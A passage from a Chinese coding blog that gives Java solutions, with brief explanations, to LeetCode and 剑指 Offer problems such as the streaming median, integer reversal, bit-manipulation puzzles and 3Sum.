<span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            list.addAll(lists[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> list.stream().mapToInt(fInteger::valueOf).toArray();</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h3 id="剑指-Offer-41-数据流中的中位数"><a href="#剑指-Offer-41-数据流中的中位数" class="headerlink" title="剑指 Offer 41. 数据流中的中位数"></a><a href="https://leetcode-cn.com/problems/shu-ju-liu-zhong-de-zhong-wei-shu-lcof/">剑指 Offer 41. 数据流中的中位数</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">用大顶堆+小顶堆方法，可以看作大顶堆是普通班，小顶堆是实验班。数量上时刻保持 小顶-大顶&lt;=1（两堆相等或者小顶比大顶多一个）。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">新学生先入普通班（大顶堆），此时可能会失去平衡了，于是取大顶堆的第一个（班里最好的学生）加入实验班（小顶堆），判断若数量过多（不是等于或多一个），取第一个（实验班里最差的学生）到普通班（大顶堆）里。 取中位数的时候，若两堆数量相等，则各取堆顶取平均，若小顶比大顶多一，则多的那一个就是中位数。</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">MedianFinder</span> &#123;</span><br><span class="line">    PriorityQueue&lt;Integer&gt; left;</span><br><span class="line">    PriorityQueue&lt;Integer&gt; right;</span><br><span class="line">    <span class="comment">/** initialize your data structure here. */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">MedianFinder</span><span class="params">()</span> &#123;</span><br><span class="line">        left = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;((x, y)-&gt; y - x);</span><br><span class="line">        right = <span class="keyword">new</span> <span class="title class_">PriorityQueue</span>&lt;&gt;();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addNum</span><span class="params">(<span class="type">int</span> num)</span> &#123;</span><br><span class="line">        <span class="comment">// 从左边加,然后再加到右边</span></span><br><span class="line">        left.add(num);</span><br><span class="line">        right.add(left.poll());</span><br><span class="line">        <span class="keyword">if</span> (left.size() + <span class="number">1</span> &lt; right.size()) &#123;</span><br><span class="line">            left.add(right.poll());</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">double</span> <span class="title function_">findMedian</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (right.size() &gt; left.size()) &#123;</span><br><span class="line">            <span class="keyword">return</span> right.peek();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> (<span class="type">double</span>) (left.peek() + right.peek()) / <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="数学"><a href="#数学" class="headerlink" title="数学"></a>数学</h2><h3 id="7-整数反转"><a href="#7-整数反转" class="headerlink" title="7. 整数反转"></a><a href="https://leetcode-cn.com/problems/reverse-integer/">7. 整数反转</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">reverse</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">    <span class="type">int</span> <span class="variable">ans</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (x != <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="type">int</span> <span class="variable">pop</span> <span class="operator">=</span> x % <span class="number">10</span>;</span><br><span class="line">      <span class="keyword">if</span> (ans &gt; Integer.MAX_VALUE / <span class="number">10</span> || ans &lt; Integer.MIN_VALUE / <span class="number">10</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      ans = ans * <span class="number">10</span> + pop;</span><br><span class="line">      x = x / <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> ans;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="9-回文数-x2F"><a href="#9-回文数-x2F" class="headerlink" title="9. 回文数&#x2F;"></a><a href="https://leetcode-cn.com/problems/palindrome-number/">9. 回文数</a>&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isPalindrome</span><span class="params">(<span class="type">int</span> x)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (x &lt; <span class="number">0</span>) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> <span class="variable">tmp</span> <span class="operator">=</span> x;</span><br><span class="line">    <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (x != <span class="number">0</span>) &#123;</span><br><span class="line">      i = i * <span class="number">10</span> + x % <span class="number">10</span>;</span><br><span class="line">      x = x / <span class="number">10</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="type">return</span> <span class="variable">tmp</span> <span class="operator">=</span>= i;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="292-Nim-游戏-x2F"><a href="#292-Nim-游戏-x2F" class="headerlink" title="292. Nim 游戏&#x2F;"></a><a href="https://leetcode-cn.com/problems/nim-game/">292. Nim 游戏</a>&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">canWinNim</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">      <span class="keyword">return</span> (n % <span class="number">4</span>) != <span class="number">0</span>;	</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="剑指-Offer-62-圆圈中最后剩下的数字"><a href="#剑指-Offer-62-圆圈中最后剩下的数字" class="headerlink" title="剑指 Offer 62. 圆圈中最后剩下的数字"></a><a href="https://leetcode-cn.com/problems/yuan-quan-zhong-zui-hou-sheng-xia-de-shu-zi-lcof/">剑指 Offer 62. 圆圈中最后剩下的数字</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">lastRemaining</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span> m)</span> &#123;</span><br><span class="line">        ArrayList&lt;Integer&gt; list = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;(n);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">            list.add(i);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (n &gt; <span class="number">1</span>) &#123;</span><br><span class="line">            index = (index + m - <span class="number">1</span>) % n;</span><br><span class="line">            list.remove(index);</span><br><span class="line">            n--;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> list.get(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;	</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">只关心最终活着那个人的序号变化</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">实际只用关心G的移动，不用在意哪步谁会被杀。</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">lastRemaining</span><span class="params">(<span class="type">int</span> n, <span class="type">int</span> m)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">ans</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="comment">// 最后一轮剩下2个人，所以从2开始反推</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">2</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            ans = (ans + m) % i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ans;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>





<h3 id="371-两整数之和"><a href="#371-两整数之和" class="headerlink" title="371. 两整数之和"></a><a href="https://leetcode-cn.com/problems/sum-of-two-integers/">371. 两整数之和</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 两个整数a, b; a ^ b是无进位的相加； a&amp;b得到每一位的进位；让无进位相加的结果与进位不断的异或， 直到进位为0；</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getSum</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">        <span class="type">int</span> sum, carry;</span><br><span class="line">        sum = a ^ b;</span><br><span class="line">        carry = (a &amp; b) &lt;&lt; <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">if</span> (carry != <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> getSum(sum, carry);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> sum ;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="剑指-Offer-20-表示数值的字符串"><a href="#剑指-Offer-20-表示数值的字符串" class="headerlink" title="剑指 Offer 20. 表示数值的字符串"></a><a href="https://leetcode-cn.com/problems/biao-shi-shu-zhi-de-zi-fu-chuan-lcof/">剑指 Offer 20. 表示数值的字符串</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">‘.’出现正确情况：只出现一次，且在e的前面</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">‘e’出现正确情况：只出现一次，且出现前有数字</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">‘+’‘-’出现正确情况：只能在开头和e后一位</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">isNumber</span><span class="params">(String s)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (s == <span class="literal">null</span> || s.length() == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        s = s.trim();</span><br><span class="line">        <span class="type">char</span>[] sc = s.toCharArray();</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">numFlag</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">eFlag</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">dotFlag</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; sc.length; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (sc[i] &gt;= <span class="string">&#x27;0&#x27;</span> &amp;&amp; sc[i] &lt;= <span class="string">&#x27;9&#x27;</span>) &#123;</span><br><span class="line">                numFlag = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (sc[i] == <span class="string">&#x27;.&#x27;</span> &amp;&amp; !dotFlag &amp;&amp; !eFlag) &#123;</span><br><span class="line">                dotFlag = <span class="literal">true</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> ((sc[i] == <span class="string">&#x27;e&#x27;</span> || sc[i] == <span class="string">&#x27;E&#x27;</span>) &amp;&amp; !eFlag &amp;&amp; numFlag) &#123;</span><br><span class="line">                eFlag = <span class="literal">true</span>;</span><br><span class="line">                numFlag = <span class="literal">false</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span> ((sc[i] == <span class="string">&#x27;+&#x27;</span> || sc[i] == <span class="string">&#x27;-&#x27;</span>) &amp;&amp; (i == <span class="number">0</span> || sc[i - <span class="number">1</span>] == <span class="string">&#x27;e&#x27;</span> || sc[i - <span class="number">1</span>] == <span class="string">&#x27;E&#x27;</span>)) &#123;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> numFlag;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="剑指-Offer-64-求1-2-…-n"><a href="#剑指-Offer-64-求1-2-…-n" class="headerlink" title="剑指 Offer 64. 求1+2+…+n"></a><a href="https://leetcode-cn.com/problems/qiu-12n-lcof/">剑指 Offer 64. 求1+2+…+n</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">sumNums</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">x</span> <span class="operator">=</span> n &gt; <span class="number">1</span> &amp;&amp; (n += sumNums(n - <span class="number">1</span>)) &gt; <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> n;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="剑指-Offer-56-I-数组中数字出现的次数"><a href="#剑指-Offer-56-I-数组中数字出现的次数" class="headerlink" title="剑指 Offer 56 - I. 数组中数字出现的次数"></a><a href="https://leetcode-cn.com/problems/shu-zu-zhong-shu-zi-chu-xian-de-ci-shu-lcof/">剑指 Offer 56 - I. 数组中数字出现的次数</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 通过mask分为2组</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] singleNumbers(<span class="type">int</span>[] nums) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length; i++) &#123;</span><br><span class="line">            k = k ^ nums[i];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">mask</span> <span class="operator">=</span> <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">while</span> ((mask &amp; k) == <span class="number">0</span>) &#123;</span><br><span class="line">            mask &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> num :</span><br><span class="line">                nums) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((num &amp; mask) == <span class="number">0</span>) &#123;</span><br><span class="line">                a ^= num;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                b ^= num;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">int</span>[]&#123;a, b&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="剑指-Offer-56-II-数组中数字出现的次数-II"><a href="#剑指-Offer-56-II-数组中数字出现的次数-II" class="headerlink" title="剑指 Offer 56 - II. 数组中数字出现的次数 II"></a><a href="https://leetcode-cn.com/problems/shu-zu-zhong-shu-zi-chu-xian-de-ci-shu-ii-lcof/">剑指 Offer 56 - II. 数组中数字出现的次数 II</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 计算每个位1出现的次数， 然后对3取余;</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">singleNumber</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="type">int</span>[] temp = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">32</span>];</span><br><span class="line">        <span class="type">int</span> mask;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> num :</span><br><span class="line">                nums) &#123;</span><br><span class="line">            mask = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">                <span class="keyword">if</span> ((num &amp; mask) != <span class="number">0</span>) &#123;</span><br><span class="line">                    temp[i] ++;</span><br><span class="line">                &#125;</span><br><span class="line">                mask = mask &lt;&lt; <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        mask = <span class="number">1</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">32</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (temp[i] % <span class="number">3</span> == <span class="number">1</span>) &#123;</span><br><span class="line">                res = res ^ mask;</span><br><span class="line"></span><br><span class="line">            &#125;</span><br><span class="line">            mask &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">singleNumber</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        Map&lt;Integer, Integer&gt; map = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="type">int</span> <span class="variable">res</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> num :</span><br><span class="line">                nums) &#123;</span><br><span class="line">            map.put(num, map.getOrDefault(num, <span class="number">0</span>) + <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> num :</span><br><span class="line">                nums) &#123;</span><br><span class="line">            <span class="keyword">if</span> (map.get(num) == <span class="number">1</span>) &#123;</span><br><span class="line">                res = num;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="剑指-Offer-39-数组中出现次数超过一半的数字"><a href="#剑指-Offer-39-数组中出现次数超过一半的数字" class="headerlink" title="剑指 Offer 39. 数组中出现次数超过一半的数字"></a><a href="https://leetcode-cn.com/problems/shu-zu-zhong-chu-xian-ci-shu-chao-guo-yi-ban-de-shu-zi-lcof/">剑指 Offer 39. 数组中出现次数超过一半的数字</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">摩尔投票法</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">给定的数组总是存在多数元素 ，因此本题不用考虑数组不存在众数 的情况。若考虑，需要加入一个 “验证环节” ，遍历数组 nums 统计 x 的数量。</span></span><br><span class="line"><span class="comment">若 x 的数量超过数组长度一半，则返回 x ；</span></span><br><span class="line"><span class="comment">否则，返回未找到众数；</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">majorityElement</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">x</span> <span class="operator">=</span> <span class="number">0</span>, votes = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> num :</span><br><span class="line">                nums) &#123;</span><br><span class="line">            <span class="keyword">if</span> (votes == <span class="number">0</span>) &#123;</span><br><span class="line">                x = num;</span><br><span class="line">            &#125;</span><br><span class="line">            votes += x == num ? <span class="number">1</span> : -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> x;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="470-用-Rand7-实现-Rand10"><a href="#470-用-Rand7-实现-Rand10" class="headerlink" title="470. 用 Rand7() 实现 Rand10()"></a><a href="https://leetcode-cn.com/problems/implement-rand10-using-rand7/">470. 用 Rand7() 实现 Rand10()</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> <span class="keyword">extends</span> <span class="title class_">SolBase</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">rand10</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> rand7();</span><br><span class="line">            <span class="type">int</span> <span class="variable">b</span> <span class="operator">=</span> rand7();</span><br><span class="line">            <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> (a-<span class="number">1</span>)*<span class="number">7</span> + b; <span class="comment">// rand 49</span></span><br><span class="line">            <span class="keyword">if</span>(num &lt;= <span class="number">40</span>) <span class="keyword">return</span> num % <span class="number">10</span> + <span class="number">1</span>; <span class="comment">// 拒绝采样</span></span><br><span class="line">            </span><br><span class="line">            a = num - <span class="number">40</span>; <span class="comment">// rand 9</span></span><br><span class="line">            b = rand7();</span><br><span class="line">            num = (a-<span class="number">1</span>)*<span class="number">7</span> + b; <span class="comment">// rand 63</span></span><br><span class="line">            <span class="keyword">if</span>(num &lt;= <span class="number">60</span>) <span class="keyword">return</span> num % <span class="number">10</span> + <span class="number">1</span>;</span><br><span class="line">            </span><br><span class="line">            a = num - <span class="number">60</span>; <span class="comment">// rand 3</span></span><br><span class="line">            b = rand7();</span><br><span class="line">            num = (a-<span class="number">1</span>)*<span class="number">7</span> + b; <span class="comment">// rand 21</span></span><br><span class="line">            <span class="keyword">if</span>(num &lt;= <span class="number">20</span>) <span class="keyword">return</span> num % <span class="number">10</span> + <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="数组和字符串"><a href="#数组和字符串" class="headerlink" title="数组和字符串"></a>数组和字符串</h2><h3 id="15-三数之和-x2F-x2F"><a href="#15-三数之和-x2F-x2F" class="headerlink" title="15. 三数之和&#x2F;&#x2F;"></a><a href="https://leetcode-cn.com/problems/3sum/">15. 三数之和</a>&#x2F;&#x2F;</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 排序+双指针</span></span><br><span class="line"><span class="comment">// 注意相同元素的处理,先元素直接跳过就不会有重复,不需要通过res.contains(tmp)来判断(会超时).</span></span><br><span class="line"><span class="comment">// -4 -1 -1 0 1 2</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> List&lt;List&lt;Integer&gt;&gt; <span class="title function_">threeSum</span><span class="params">(<span class="type">int</span>[] nums)</span> &#123;</span><br><span class="line">        List&lt;List&lt;Integer&gt;&gt; res = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">if</span> (nums == <span class="literal">null</span> || nums.length &lt; <span class="number">3</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> res;</span><br><span class="line">        &#125;</span><br><span class="line">        Arrays.sort(nums);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nums.length - <span class="number">2</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (nums[i] &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (i &gt; <span class="number">0</span> &amp;&amp; nums[i] == nums[i - <span class="number">1</span>]) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">int</span> <span class="variable">l</span> <span class="operator">=</span> i + <span class="number">1</span>;</span><br><span class="line">            <span class="type">int</span> <span class="variable">r</span> <span class="operator">=</span> nums.length - <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">while</span> (l &lt; r) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">sum</span> <span class="operator">=</span> nums[i] + nums[l] + nums[r];</span><br><span class="line">                <span class="keyword">if</span> (sum == <span class="number">0</span>) &#123;</span><br><span class="line">                    ArrayList&lt;Integer&gt; tmp = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">                    tmp.add(nums[i]);</span><br><span class="line">                    tmp.add(nums[l]);</span><br><span class="line">                    tmp.add(nums[r]);</span><br><span class="line">                    res.add(tmp);</span><br><span class="line">                    <span class="keyword">while</span> (l &lt; r &amp;&amp; nums[l] == nums[l + <span class="number">1</span>]) &#123;</span><br><span class="line">                        ++l;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">while</span> (l &lt; r &amp;&amp; nums[r] == nums[r - <span class="number">1</span>]) &#123;</span><br><span class="line">                        --r;</span><br><span class="line">                    &#125;</span><br><span class="line">                    ++l;</span><br><span class="line">                    --r;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (sum &lt; <span class="number">0</span>) &#123;</span><br><span class="line">                    ++l;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    --r;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="4-寻找两个正序数组的中位数"><a href="#4-寻找两个正序数组的中位数" class="headerlink" title="4. 寻找两个正序数组的中位数"></a><a href="https://leetcode-cn.com/problems/median-of-two-sorted-arrays/">4. 寻找两个正序数组的中位数</a></h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">关键点:找第k小的数</span></span><br><span class="line"><span class="comment">k = 7</span></span><br><span class="line"><span class="comment">A: 1 3 4 9</span></span><br><span class="line"><span class="comment">B: 1 2 3  4 5  6 7 8 9</span></span><br><span class="line"><span class="comment">k = 4</span></span><br><span class="line"><span class="comment">A: 1 3 4 9</span></span><br><span class="line"><span class="comment">B: 4 5  6 7 8 9</span></span><br><span class="line"><span class="comment">k = 2</span></span><br><span class="line"><span class="comment">A: 4 9</span></span><br><span class="line"><span class="comment">B: 4 5  6 7 8 9</span></span><br><span class="line"><span class="comment">k = 1</span></span><br><span class="line"><span class="comment">A: 9</span></span><br><span class="line"><span class="comment">B: 4 5  6 7 8 9</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">double</span> <span class="title function_">findMedianSortedArrays</span><span class="params">(<span class="type">int</span>[] nums1, <span class="type">int</span>[] nums2)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">m</span> <span class="operator">=</span> nums1.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">n</span> <span class="operator">=</span> nums2.length;</span><br><span class="line">        <span class="type">int</span> <span class="variable">total</span> <span class="operator">=</span> m + n;</span><br><span class="line">        <span class="keyword">if</span> (total % <span class="number">2</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">m1</span> <span class="operator">=</span> total / <span class="number">2</span>;</span><br><span class="line">            <span 